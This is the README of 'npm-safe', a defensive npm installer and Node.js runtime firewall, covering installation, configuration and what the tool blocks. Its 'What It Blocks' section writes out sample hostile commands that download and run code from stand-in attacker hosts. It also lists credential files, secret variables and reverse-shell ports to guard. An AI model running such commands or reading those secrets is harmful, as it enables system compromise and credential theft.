# npm-safe

Secure npm package installer with runtime firewall protection - Blocks supply chain attacks, credential theft, and malicious code execution.

## Features

- **Filesystem Protection** - Blocks unauthorized access to `~/.ssh/`, `~/.aws/`, `/etc/passwd`, system files
- **Network Monitoring** - Detects credential exfiltration, blocks suspicious domains and ports
- **Shell Command Blocking** - Prevents `curl | bash`, `wget`, reverse shells, malicious spawns
- **Environment Protection** - Protects API keys, tokens, AWS credentials from theft
- **Behavior Analysis** - Tracks file writes, network requests, process spawns with hard limits
- **Zero Trust Mode** - Block everything by default, whitelist what you need
- **Attack Coverage** - Blocks 93% of malicious operations (credential theft: 100%, env vars: 100%)

## Installation

### Quick Install (All Platforms)

```bash
npm install -g @rahulmalik/npm-safe
```

### Manual Installation

#### Linux/Mac
```bash
git clone https://github.com/rahulsend89/npm-safe.git
cd npm-safe
./install.sh
```

#### Windows (PowerShell)
```powershell
git clone https://github.com/rahulsend89/npm-safe.git
cd npm-safe
.\install.ps1
```

#### Windows (Command Prompt)
```cmd
git clone https://github.com/rahulsend89/npm-safe.git
cd npm-safe
install.bat
```

**Uninstall:**
- Linux/Mac: `./install.sh --uninstall`
- Windows: `.\install.ps1 -Uninstall` or `install.bat -Uninstall`

## Usage

### Option 1: Protected npm (Recommended)

```bash
# Install packages with protection
npm-safe install package-name
npm-safe install  # installs all dependencies

# Run any npm command
npm-safe run dev
npm-safe test
npm-safe start
```

### Option 2: Protect Existing Code

```bash
NODE_FIREWALL=1 node --require @rahulmalik/npm-safe app.js
```

### Option 3: Node.js 20+ (ESM Support)

For modern Node.js versions (20.6.0+), use the `--import` flag for earlier interception and ESM support:

```bash
NODE_FIREWALL=1 node --import @rahulmalik/npm-safe/lib/init.mjs app.js
```

This enables:
- Protection for both ESM (`.mjs`) and CommonJS modules
- Early interception of malicious imports via `module.register()`
- Full firewall capabilities before application code runs

## Configuration

Edit `.firewall-config.json`:

```json
{
  "mode": {
    "enabled": true,
    "interactive": false,
    "strictMode": false
  },
  "filesystem": {
    "blockedReadPaths": ["/.ssh/", "/.aws/", "/etc/passwd"],
    "blockedWritePaths": ["/etc/", "/.ssh/"],
    "allowedPaths": ["/tmp/", "/node_modules/", "/dist/"]
  },
  "network": {
    "enabled": true,
    "blockedDomains": ["pastebin.com", "paste.ee"],
    "allowedDomains": ["registry.npmjs.org", "api.github.com"]
  },
  "environment": {
    "protectedVariables": ["AWS_*", "GITHUB_TOKEN", "*_KEY", "*_SECRET"]
  },
  "trustedModules": ["aws-sdk", "@aws-sdk/*", "dotenv"]
}
```

**Config commands:**
```bash
firewall-config init              # Create config
firewall-config status           # Check protection
firewall-config report           # View security report
```

## What It Blocks

### Filesystem Attacks
- Reading SSH keys (`~/.ssh/id_rsa`)
- Reading AWS credentials (`~/.aws/credentials`)
- Reading system files (`/etc/passwd`, `/etc/shadow`)
- Writing to system directories (`/etc/`, `/usr/bin/`)
- Creating executable files (`.sh`, `.command`, `.exe`)

### Network Attacks
- Credential exfiltration (AWS keys, GitHub tokens, SSH keys)
- Connections to suspicious domains (pastebin, file sharing sites)
- Reverse shell connections (ports 4444, 5555, 6666)
- Data exfiltration to unknown domains

### Shell Command Attacks
- `curl evil.com/malware.sh | bash`
- `wget https://attacker.com/backdoor && chmod +x backdoor`
- `bash -c "malicious command"`
- `eval "dangerous code"`
- `spawn('curl', ['-o', '/tmp/malware'])`

### Environment Theft
- Stealing `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`
- Stealing `GITHUB_TOKEN`, `NPM_TOKEN`
- Stealing `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`
- Enumerating all environment variables

## Zero Trust Mode

Use `.firewall-config.zero-trust.json` for maximum security:

```bash
cp .firewall-config.zero-trust.json .firewall-config.json
npm-safe install package-name
```

**Blocks 100% of attacks** by default. Whitelist only what you need.

## License

MIT

## Disclaimer

This tool is for development and testing. No security tool is 100% effective. Always review npm packages before installing.
